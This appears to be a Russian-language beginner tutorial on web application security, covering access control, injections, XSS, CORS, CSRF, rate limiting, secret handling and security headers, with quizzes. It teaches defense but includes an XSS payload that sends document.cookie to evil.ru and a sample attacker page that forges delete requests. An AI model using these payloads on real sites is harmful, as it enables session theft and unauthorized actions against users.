Их так много, что специалисты по безопасности составили официальный список самых частых дыр. Знать его — уже половина защиты.

### На пальцах

### Как это работает
>> Инъекции → сломанный контроль доступа → XSS → … → проверь проект по списку

Три самые важные для начинающего:

**1. Сломанный контроль доступа** — первое место в списке. Пользователь получает доступ к чужому: меняет id в адресе `/api/orders/124` на `/api/orders/125` и видит чужой заказ.
Защита: проверка владельца и роли в каждом маршруте на сервере, фильтр списков по пользователю.

**2. Инъекции** — данные пользователя становятся частью команды: SQL, команды ОС, запросы к другим системам.
Защита: параметризованные запросы, ORM, никогда не склеивать команды из ввода.

**3. XSS (межсайтовый скриптинг)** — пользователь вставляет на страницу свой JavaScript, например в комментарий: `<img src=x onerror="fetch('https://evil.ru?c='+document.cookie)">`. Код выполнится у всех, кто откроет страницу.
Защита: выводить пользовательский текст как текст (`textContent`, JSX по умолчанию), не использовать `innerHTML` и `dangerouslySetInnerHTML` с пользовательскими данными, при необходимости — очищать HTML библиотекой DOMPurify, httpOnly-cookie, заголовок CSP.

Другие пункты списка: криптографические ошибки (пароли без хеширования, HTTP вместо HTTPS), небезопасная конфигурация (включённый режим отладки, стандартные пароли), устаревшие уязвимые зависимости, ошибки аутентификации (нет защиты от перебора), подделка запросов на сервере (SSRF) и другие.

### Ситуация
Фронтенд на `localhost:5173` делает запрос к API на `localhost:3000` — и консоль краснеет: «blocked by CORS policy». Ты гуглишь, находишь совет «поставь `Access-Control-Allow-Origin: *`», и всё заработало. А потом думаешь, что настроил безопасность. На самом деле CORS вообще не защищает API, и понимание этого — частый вопрос на собеседованиях.

### На пальцах
CORS — правило охранника в браузере, а не на сервере. Браузер говорит: «Скрипт с сайта A хочет прочитать ответ сайта B. Сайт B, ты разрешаешь?» Если сервер не разрешил — браузер не отдаст ответ скрипту. Но curl, Postman или скрипт злоумышленника на своём компьютере этого охранника не имеют — для них CORS не существует.

### Как это работает
>> Чужой сайт → `fetch` к API → браузер смотрит `Access-Control-Allow-Origin` → прочитать можно или нет

- **Origin** (источник) — протокол + домен + порт: `https://studio.ru`, `http://localhost:5173`. Разные порты — разные источники.
- По умолчанию браузер запрещает скрипту читать ответы с другого источника (Same-Origin Policy).
- CORS — способ для сервера сказать браузеру: «этому источнику можно». Делается заголовками ответа:
  - `Access-Control-Allow-Origin: https://studio.ru`
  - `Access-Control-Allow-Credentials: true` — если нужны cookie
  - `Access-Control-Allow-Methods`, `Access-Control-Allow-Headers` — для сложных запросов.
- Для «сложных» запросов (JSON-тело, PUT/DELETE, свои заголовки) браузер сначала отправляет предварительный запрос `OPTIONS` (preflight) и спрашивает разрешения.

Почему CORS — не защита API:

- он ограничивает только браузеры;
- простой запрос всё равно доходит до сервера и выполняется — браузер лишь не показывает ответ скрипту;
- защищают API аутентификация, авторизация, rate limiting, валидация.

Правило: разрешай только свои фронтенды, без `*`, особенно если используются cookie.

?: Зачем тогда вообще нужна Same-Origin Policy, если она не защищает сервер? || Она защищает пользователя. Без неё любой сайт, который ты открыл, мог бы от твоего имени прочитать твою почту или банковский кабинет в соседней вкладке — браузер приложил бы твои cookie. Политика не даёт чужому скрипту прочитать эти ответы.

### Пример
```js
const ALLOWED = ["http://localhost:5173", "https://studio.ru"];

app.use(cors({
  origin(origin, cb) {
    if (!origin || ALLOWED.includes(origin)) cb(null, true);
    else cb(new Error("Origin не разрешён"));
  },
  credentials: true,
}));
```

?! Запрос пришёл со страницы `http://localhost:3001` и через curl из терминала. Что сделает сервер в каждом случае? || Со страницы `localhost:3001` — отклонит: порт другой, значит, это другой источник, которого нет в списке. Curl не присылает заголовок `Origin`, сработает `!origin`, и запрос пройдёт — CORS для него не существует.

### Частые ошибки
- **`Access-Control-Allow-Origin: *` с cookie** — браузер такое не примет, а без cookie открывает API всем сайтам.
- **Вера, что настроенный CORS защищает данные.**
- **Попытка чинить ошибку CORS на фронтенде** — её чинят только на сервере (или прокси в dev-сервере).

### Проверь себя
?? Что такое origin? || Сочетание протокола, домена и порта, например `https://studio.ru` или `http://localhost:5173`.
?? Что такое preflight-запрос? || Предварительный запрос `OPTIONS`, которым браузер спрашивает у сервера разрешение перед «сложным» межсайтовым запросом.
?? Объясни своими словами, почему CORS не защищает API. || Его соблюдают только браузеры. Любая программа вне браузера отправит запрос напрямую, и сервер его выполнит. Защищают API проверки входа, прав и данных на самом сервере.

### Ситуация
Ты вошёл в админку своего магазина и в соседней вкладке открыл ссылку из подозрительного письма. Страница пустая, ты закрыл её. А в админке пропали три товара: та страница незаметно отправила форму удаления на твой сайт, и браузер услужливо приложил твою cookie. Это CSRF — атака, при которой ты сам, не зная того, делаешь запрос от своего имени.

### На пальцах
CSRF — когда злоумышленник заставляет твой браузер отправить запрос от твоего имени. Ты вошёл в банк, а потом открыл подозрительный сайт. Он незаметно отправляет форму «перевести деньги» на сайт банка. Браузер прикладывает твою cookie — и банк думает, что это ты. SameSite у cookie — правило: «не прикладывай записку, если письмо отправляет чужой сайт».

### Как это работает
>> Чужая страница шлёт форму → браузер прикладывает cookie? → `SameSite=Lax` → нет

Почему атака возможна: браузер раньше прикладывал cookie к любому запросу на сайт, откуда бы он ни был отправлен — с формы на другом сайте, через картинку, через скрипт.

Защита:

1. **SameSite=Lax** у cookie сессии — браузер не отправит её при POST-запросе с другого сайта. Сейчас это значение по умолчанию в браузерах, но ставь явно.
2. **Не менять данные по GET** — переход по ссылке с другого сайта с `SameSite=Lax` cookie отправляет.
3. **Требовать JSON** для изменяющих запросов: HTML-форма с чужого сайта не может отправить `Content-Type: application/json`, а `fetch` с таким заголовком на чужой домен вызовет preflight CORS, который твой сервер не разрешит.
4. **CSRF-токен** — сервер выдаёт случайный токен, который фронтенд прикладывает к каждой форме; чужой сайт его не знает.
5. Проверка заголовка `Origin` на изменяющих запросах.

Если аутентификация не через cookie, а через заголовок `Authorization`, CSRF не страшен — браузер не подставляет этот заголовок сам.

?: Почему CSRF не грозит API, где токен передаётся в заголовке `Authorization`? || Cookie браузер прикладывает автоматически к каждому запросу на сайт, а заголовок `Authorization` добавляет только твой собственный код. Чужой сайт не знает токен и не может заставить браузер подставить его.

### Пример
```html
<!-- страница злоумышленника -->
<img src="https://shop.ru/admin/products/7/delete">
<form action="https://shop.ru/api/products/8" method="POST">
  <input type="hidden" name="_method" value="DELETE">
</form>
<script>document.forms[0].submit()</script>
```

?! У cookie сессии `SameSite=Lax`, удаление в админке есть и по GET-ссылке, и по POST. Какая из двух атак сработает? || Сработает картинка с GET-ссылкой: `Lax` отправляет cookie при навигации и загрузке ресурсов по GET в ряде случаев, а сервер удаляет данные по GET. POST-форма с чужого сайта уйдёт без cookie. Вывод: никогда не изменять данные GET-запросами.

### Частые ошибки
- **Удаление и изменение через GET-ссылки.**
- **`SameSite=None`** для cookie сессии без реальной необходимости.
- **Изменяющие запросы как обычные формы** (`urlencoded`) без CSRF-токена.

### Проверь себя
?? Что такое CSRF? || Атака, при которой чужой сайт заставляет браузер пользователя отправить запрос на твой сайт, и браузер прикладывает cookie пользователя, так что запрос выглядит как его собственный.
?? Какое значение `SameSite` защищает от большинства CSRF-атак, не мешая переходам по ссылкам? || `SameSite=Lax`.
?? Объясни своими словами, почему изменять данные по GET-запросам опасно. || GET-ссылки открывают картинки, предзагрузка браузера и переходы с других сайтов, и cookie при этом часто отправляется. Любая такая ссылка может незаметно выполнить действие от имени пользователя.

### Мини-задание
Проверь cookie сессии своего проекта: стоит ли `SameSite=Lax`. Добавь middleware, которое отклоняет изменяющие запросы не в JSON. Попробуй отправить форму на свой API с другой локальной страницы и убедись, что запрос не прошёл.

### Ситуация
В логах сервера — 40 000 попыток входа за ночь в аккаунт `admin@studio.ru`, по одной каждую секунду, с разными паролями из словаря. Если ничего не ограничивает число попыток, рано или поздно один пароль подойдёт. А в другом проекте бот за час отправил тысячу СМС с кодами через форму регистрации — и выставил счёт на 15 000 рублей.

### На пальцах
Без ограничения попыток вход в аккаунт — кодовый замок, к которому можно подбирать код бесконечно и быстро. Rate limiting — после пяти неправильных кодов замок блокируется на 15 минут. Для честного пользователя незаметно, а перебор миллиона паролей превращается в годы.

### Как это работает
>> Попытки входа → счётчик по IP и логину → больше лимита → 429 и пауза

Rate limiting — ограничение числа запросов за промежуток времени по ключу: IP-адрес, пользователь, email.

Где нужен в первую очередь:

- вход и восстановление пароля — защита от подбора;
- регистрация и отправка писем и СМС — защита от спама и счетов;
- дорогие операции — генерация отчётов, запросы к платным API (например, к нейросети);
- весь API — общий щедрый лимит от перегрузок.

Как устроено:

- счётчик запросов по ключу за окно времени (например, 10 неудачных входов за 15 минут);
- превышение — ответ **429 Too Many Requests** и заголовок `Retry-After`;
- счётчики в памяти — пока сервер один; при нескольких экземплярах — в Redis.

Для входа считают именно неудачные попытки, по ключу «IP + email».

?: Почему для входа ключ лимита — «IP + email», а не только email? || Если считать только по email, злоумышленник может нарочно ввести неверный пароль десять раз и заблокировать вход настоящему владельцу аккаунта. С ключом «IP + email» блокируется только тот, кто перебирает, а сам пользователь со своего адреса войдёт.

### Пример
```js
const loginLimiter = rateLimit({
  windowMs: 15 * 60_000,
  limit: 10,
  skipSuccessfulRequests: true,
  keyGenerator: req => `${req.ip}:${String(req.body?.email ?? "").toLowerCase()}`,
});
app.post("/api/auth/login", loginLimiter, loginHandler);
```

?! Сервер стоит на Render за прокси, и `trust proxy` не настроен. Что увидит лимитер в `req.ip` и к чему это приведёт? || IP самого прокси, одинаковый для всех посетителей. Счётчики станут общими: десять ошибок любых людей с одним email заблокируют вход для всех. Нужно `app.set("trust proxy", 1)`, чтобы Express брал настоящий IP из заголовка.

### Частые ошибки
- **Вход без всяких ограничений.**
- **Лимит в памяти при нескольких экземплярах сервера** — у каждого свой счётчик.
- **Нет `trust proxy` за прокси** (Render, Nginx) — все запросы с одного IP.

### Проверь себя
?? Какой код ответа возвращают при превышении лимита запросов? || 429 Too Many Requests, обычно с заголовком `Retry-After`.
?? Где rate limiting нужен в первую очередь? || На входе и восстановлении пароля, регистрации и отправке писем и СМС, дорогих операциях вроде запросов к платным API.
?? Объясни своими словами, зачем считать только неудачные попытки входа. || Чтобы не мешать человеку, который часто входит правильно, и останавливать именно перебор паролей.

### Ситуация
Разработчик «на минутку» вписал ключ платёжной системы прямо в код и запушил на GitHub. Через пять минут ему пишет поддержка: ключ использован для сотни подозрительных операций. Он удаляет файл из репозитория — но ключ всё ещё в истории коммитов, и боты продолжают им пользоваться. Работа с секретами — тема, где одна ошибка стоит дороже всех остальных.

### На пальцах
Секреты — ключи от сейфа: пароль базы, ключи платёжки, секрет подписи сессий. Их не оставляют на столе (в коде), не фотографируют (в Git) и не показывают на витрине (во фронтенде). Ротация — периодическая смена замков: если ключ мог утечь, его меняют, и старый перестаёт подходить.

### Как это работает
>> Секрет в `.env` → `.gitignore` → на хостинге в настройках → утёк — сменить

Правила хранения:

- секреты — только в переменных окружения сервера; локально — в `.env`, который в `.gitignore`;
- в репозитории — `.env.example` без значений;
- во фронтенд-коде секретов нет вообще;
- у каждого окружения свои ключи: разработка, тесты, продакшен;
- минимальные права: ключ для чтения не должен уметь удалять.

Если секрет утёк:

1. Немедленно выпустить новый ключ у сервиса и отозвать старый.
2. Обновить переменные окружения на сервере и перезапустить.
3. Проверить логи сервиса на подозрительное использование.
4. Удаление файла из репозитория не помогает: он остаётся в истории.

Для `JWT_SECRET` смена ключа разлогинит всех пользователей — это нужно учитывать.

Инструменты: GitHub Secret Scanning, менеджеры секретов (Doppler, Vault, секреты хостинга).

### Ситуация
Ты проверяешь свой сайт на securityheaders.com и получаешь оценку F красным. Сайт не взломан, но браузеру не сказано, как его защищать: его можно показать во фрейме на чужом сайте и обманом заставить кликнуть, скрипты грузятся откуда угодно. Пять заголовков ответа поднимают оценку до A, и большую часть делает одна строка кода.

### На пальцах
Заголовки безопасности — инструкции браузеру, как охранять твой сайт: «не открывай меня во фрейме на чужом сайте», «всегда ходи ко мне только по HTTPS», «не угадывай тип файла», «выполняй скрипты только с моего домена». helmet — пакет, который ставит разумный набор таких инструкций одной строкой.

### Как это работает
>> `helmet()` → заголовки безопасности → CSP — откуда можно грузить скрипты

| Заголовок | Что делает | Защищает от |
|---|---|---|
| `Content-Security-Policy` (CSP) | разрешает загружать скрипты, стили, картинки только из указанных источников | XSS: даже внедрённый скрипт не выполнится |
| `Strict-Transport-Security` (HSTS) | браузер ходит на сайт только по HTTPS | перехвата при первом входе по HTTP |
| `X-Frame-Options` / `frame-ancestors` | запрет показывать сайт во фрейме на чужих сайтах | кликджекинга |
| `X-Content-Type-Options: nosniff` | браузер не угадывает тип файла | выполнения загруженных файлов как скриптов |
| `Referrer-Policy` | сколько информации об адресе передавать другим сайтам | утечки адресов с токенами |

`helmet()` в Express ставит всё это с безопасными значениями по умолчанию и убирает заголовок `X-Powered-By: Express`.

CSP — самый мощный и самый капризный: нужно перечислить все источники скриптов, шрифтов, картинок и запросов. Начинают с режима `Content-Security-Policy-Report-Only`, который только сообщает о нарушениях.

Проверить заголовки: securityheaders.com или Network → Response Headers.

?: Как CSP останавливает XSS, даже если злоумышленник смог вставить скрипт на страницу? || Браузер проверяет каждый скрипт по списку разрешённых источников. Встроенный в комментарий `<script>` или скрипт с чужого домена в списке не значится, и браузер откажется его выполнять.

### Пример
```js
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'"],
      imgSrc: ["'self'", "data:"],
      frameAncestors: ["'none'"],
    },
  },
}));
```

?! Сайт подключает шрифты с fonts.googleapis.com и картинки с CDN. Что сломается после включения этого CSP? || Стили Google Fonts и сами шрифты (их нет в `styleSrc` и `fontSrc`), а также картинки с CDN (в `imgSrc` только свой домен и `data:`). Браузер заблокирует их, и в консоли появятся ошибки CSP. Поэтому начинают с `Report-Only` и добавляют нужные источники.

### Частые ошибки
- **Строгий CSP сразу** — сайт ломается. Начинай с Report-Only.
- **`'unsafe-inline'` в `script-src`** «чтобы заработало» — CSP почти перестаёт защищать от XSS.
- **HSTS с большим сроком** на домене, где ещё не везде работает HTTPS.

### Проверь себя
?? Что делает заголовок `Strict-Transport-Security`? || Велит браузеру всегда открывать сайт только по HTTPS, даже если пользователь ввёл адрес с `http://`.
?? От какой атаки защищает `frame-ancestors 'none'`? || От кликджекинга — когда сайт показывают в невидимом фрейме на чужой странице и обманом заставляют кликнуть.
?? Объясни своими словами, что такое Content Security Policy. || Список правил для браузера, откуда этому сайту разрешено загружать скрипты, стили, картинки и куда делать запросы. Всё остальное браузер блокирует.
